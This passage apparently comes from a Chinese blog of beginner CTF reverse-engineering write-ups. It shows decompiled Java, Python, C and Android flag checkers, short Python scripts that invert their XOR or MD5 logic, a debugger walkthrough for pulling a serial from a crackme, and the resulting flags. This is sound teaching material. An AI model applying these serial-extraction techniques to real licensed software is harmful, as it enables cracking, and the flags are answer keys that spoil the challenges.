class="built_in">str</span> = <span class="string">&quot;NRQ@PAu;8j[+(R:2806.i&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">ord</span>(<span class="built_in">str</span>[i]) + i</span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{B@se64_HAHAHA}</p><h2 id="ç»™é˜¿å§¨å€’ä¸€æ¯Jvav"><a href="#ç»™é˜¿å§¨å€’ä¸€æ¯Jvav" class="headerlink" title="ç»™é˜¿å§¨å€’ä¸€æ¯Jvav"></a>ç»™é˜¿å§¨å€’ä¸€æ¯Jvav</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Reverse</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag ï¼š&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is ï¼š&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="type">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span>[] arr)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">32</span>;</span><br><span class="line">            Resultlist.add(result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] KEY = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; ++j) &#123;</span><br><span class="line">            KEYList.add(KEY[j]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulationsï¼&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Errorï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javaé€†å‘ï¼Œæ‹–åˆ°ijé‡Œé¢ã€‚flagè¢«EncryptåŠ å¯†äº†ï¼ŒåŠ å¯†é€»è¾‘å°±æ˜¯flagçš„æ¯ä¸€ä½åŠ ä¸Š64^32ã€‚</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] - <span class="number">64</span> ^ <span class="number">32</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{This_is_the_flag_!}</p><h2 id="ä½ çŸ¥é“ä»€ä¹ˆæ˜¯Pyå˜›ï¼Ÿ"><a href="#ä½ çŸ¥é“ä»€ä¹ˆæ˜¯Pyå˜›ï¼Ÿ" class="headerlink" title="ä½ çŸ¥é“ä»€ä¹ˆæ˜¯Pyå˜›ï¼Ÿ"></a>ä½ çŸ¥é“ä»€ä¹ˆæ˜¯Pyå˜›ï¼Ÿ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;please input your flag:&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr=[<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(s)!=<span class="number">35</span>  <span class="keyword">or</span> s[<span class="number">0</span>]!=<span class="string">&#x27;N&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(s[i-<span class="number">1</span>])^<span class="built_in">ord</span>(s[i])!=arr[i-<span class="number">1</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br></pre></td></tr></table></figure><p>pythoné€†å‘ã€‚è¿™é¢˜ç›´æ¥ç»™æºç äº†ã€‚è¦æ±‚ord(s[i-1])^ord(s[i])!=arr[i-1]ï¼Œå·²çŸ¥s[0] = â€˜Nâ€™ã€‚é‚£ä¹ˆå°±èƒ½é€’æ¨åé¢çš„s[i]äº†ï¼šs[i+1] = arr[i]^s[i]ã€‚</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line">s = &#123;&#125;</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(arr)):</span><br><span class="line">    s[<span class="number">0</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">    s[i+<span class="number">1</span>] = arr[i]^s[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Pyth0n_1s_th3_best_l@nguage}</p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>ä¸æ€ä¹ˆå¥½odï¼Œå®˜æ–¹wpã€‚</p><p>æ‰¾å‡ºCreakMeçš„Serial</p><p>è¦å­¦ä¹ ä½¿ç”¨Olldbgçš„ä½¿ç”¨</p><p><a href="https://bbs.pediy.com/thread-271168.htm">[åŸåˆ›]ã€Šä½¿ç”¨ OD ä»é›¶å¼€å§‹ Crackingã€‹å­¦ä¹ ç¬”è®°-è½¯ä»¶é€†å‘-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a></p><p>é€šè¿‡ODä¸­çš„å­—ç¬¦ä¸²æŸ¥æ‰¾æ’ä»¶æ‰¾åˆ°åˆ¤æ–­æ­£ç¡®æˆ–é”™è¯¯çš„å­—ç¬¦ä¸²ä½ç½®</p><p>ä½¿ç”¨F2 è®¾ç½®æ–­ç‚¹ ç„¶åF9è¿è¡Œ</p><p>åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†æ˜æ–‡æ¯”è¾ƒçš„serial å–å‡ºæ¥å³å¯</p><p>æ³¨æ„è¿™ä¸ª172â€¦.æ˜¯é”™è¯¯çš„ éœ€è¦åœ¨å†…å­˜ä¸­æ‰¾åˆ°çœŸæ­£çš„å­—ç¬¦ä¸²</p><h2 id="Little-Endian"><a href="#Little-Endian" class="headerlink" title="Little Endian"></a>Little Endian</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  v6 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v6 != (enc[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data3rr0r!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>encé‡Œé¢å°±æ˜¯å¯†æ–‡äº†ï¼Œé€»è¾‘å°±æ˜¯v6å’Œenc[i]^0x12345678æ¯”è¾ƒï¼Œæ¯æ¬¡v6éƒ½ä¼šè‡ªå¢4ï¼ˆæ²¡è½¯ç”¨ï¼‰ã€‚è¦æ³¨æ„çš„æ˜¯<em>(_DWORD </em>)v6æ˜¯å¤§ç«¯åºï¼Œä½†æ˜¯æ•°æ®åœ¨å†…å­˜ä¸­éƒ½æ˜¯å°ç«¯åºï¼Œæ‰€ä»¥è¦å°†å…¶åè½¬ä¸€ä¸‹ã€‚ä¸€èˆ¬åœ¨CPUï¼Œx86éƒ½æ˜¯å°ç«¯åºï¼Œä½†æ˜¯IDAä¼šå°†ä¹‹è½¬æ¢ä¸ºäº†å¤§ç«¯åºã€‚pythonä¸æ€ä¹ˆç†Ÿï¼Œå°±ç›´æ¥æš´åŠ›åˆ‡ç‰‡äº†ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/oN9ybAe3Mz5digR.png" alt="image-20221020102007833.png"></p><p><img src="https://s2.loli.net/2023/08/04/kGTB3Njb4HlCAYh.png" alt="image-20221012173123111.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = [<span class="number">0x51670536</span>, <span class="number">0x5E4F102C</span>, <span class="number">0x7E402211</span>, <span class="number">0x7C71094B</span>, <span class="number">0x7C553F1C</span>, <span class="number">0x6F5A3816</span>]</span><br><span class="line">dex = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag = enc[i]^<span class="number">0x12345678</span></span><br><span class="line">    dex = dex +<span class="built_in">hex</span>(flag)[<span class="number">8</span>:<span class="number">10</span>]+<span class="built_in">hex</span>(flag)[<span class="number">6</span>:<span class="number">8</span>]+<span class="built_in">hex</span>(flag)[<span class="number">4</span>:<span class="number">6</span>]+<span class="built_in">hex</span>(flag)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(base64.b16decode(dex.upper()))</span><br></pre></td></tr></table></figure><p>NSSCTF{Littl3_Endiannnn}</p><h2 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy_Android"></a>Easy_Android</h2><p>jebåç¼–è¯‘ï¼Œçœ‹æ ¸å¿ƒä»£ç ï¼Œjavä»£ç å®¡è®¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.crackme;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn_register;</span><br><span class="line">    <span class="keyword">private</span> EditText edit_sn;</span><br><span class="line">    String edit_userName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSN</span><span class="params">(String arg11, String arg12)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg11 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(arg11.length() != <span class="number">0</span> &amp;&amp; (arg12 != <span class="literal">null</span> &amp;&amp; arg12.length() == <span class="number">22</span>)) &#123;</span><br><span class="line">                <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                digest.reset();</span><br><span class="line">                digest.update(arg11.getBytes());</span><br><span class="line">                <span class="type">String</span> <span class="variable">hexstr</span> <span class="operator">=</span> MainActivity.toHexString(digest.digest(), <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                    sb.append(((<span class="type">char</span>)hexstr.charAt(i)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="string">&quot;flag&#123;&quot;</span> + sb.toString() + <span class="string">&quot;&#125;&quot;</span>.equalsIgnoreCase(arg12);</span><br><span class="line">                <span class="keyword">return</span> v8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg3)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg3);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040019</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="number">0x7F06001D</span>);  <span class="comment">// string:unregister &quot;TopCtf&quot;</span></span><br><span class="line">        <span class="built_in">this</span>.edit_userName = <span class="string">&quot;Tenshine&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.edit_sn = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0051</span>);  <span class="comment">// id:edit_sn</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register = (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0052</span>);  <span class="comment">// id:button_register</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_userName.trim();</span><br><span class="line">                <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_sn.getText().toString().trim();</span><br><span class="line">                <span class="keyword">if</span>(!MainActivity.<span class="built_in">this</span>.checkSN(v1, v2)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001E</span>, <span class="number">0</span>).show();  <span class="comment">// string:unsuccessed &quot;é”™è¯¯!&quot;</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001B</span>, <span class="number">0</span>).show();  <span class="comment">// string:successed &quot;æ­å–œæ‚¨ï¼&quot;</span></span><br><span class="line">                MainActivity.<span class="built_in">this</span>.btn_register.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                MainActivity.<span class="built_in">this</span>.setTitle(<span class="number">0x7F060019</span>);  <span class="comment">// string:registered &quot;æ­å–œ&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.getMenuInflater().inflate(<span class="number">0x7F0D0000</span>, menu);  <span class="comment">// menu:activity_main</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">toHexString</span><span class="params">(<span class="type">byte</span>[] arg8, String arg9)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> i$;</span><br><span class="line">        <span class="keyword">for</span>(i$ = <span class="number">0</span>; i$ &lt; arg8.length; ++i$) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(arg8[i$] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            <span class="keyword">if</span>(hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hexString.append(hex).append(arg9);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tenshineç»è¿‡md5åŠ å¯†åå¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œæ¯æ¬¡å–i += 2ï¼Œå¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Tenshine&#x27;</span></span><br><span class="line">md5 = hashlib.md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(md5),<span class="number">2</span>):</span><br><span class="line">    flag += md5[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NSSCTF&#123;%s&#125;&#x27;</span>%flag)</span><br></pre></td></tr></table></figure><h2 id="æ¥è§£ä¸ªæ–¹ç¨‹"><a href="#æ¥è§£ä¸ªæ–¹ç¨‹" class="headerlink" title="æ¥è§£ä¸ªæ–¹ç¨‹?"></a>æ¥è§£ä¸ªæ–¹ç¨‹?</h2><p>idaè¿›å…¥æ ¸å¿ƒå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°result = (unsigned int)(186 <em> v18 + 2712 </em> v17 + 2136 <em> v16 + 98 </em> v13 + 138 <em> v14 + 3584 </em> v15 + 1173 * v19ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ±‚è¿™å‡ ä¸ªå‚æ•°äº†ã€‚</p><figure class="highlight c++"><table><tr><td 